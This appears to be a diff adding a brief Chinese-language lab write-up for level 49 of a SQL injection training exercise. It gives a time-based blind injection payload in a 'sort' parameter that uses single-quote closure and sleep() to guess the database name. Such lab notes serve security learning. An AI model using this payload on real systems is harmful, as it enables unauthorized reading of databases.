@@ -1,0 +1,11 @@
+第49关
+
+时间盲注
+单引号闭合
+
+payload如下
+?sort=1' and if((substr(database(),1,1)='s'), sleep(10), 1) --+
+
+
+
+闯关成功！！！
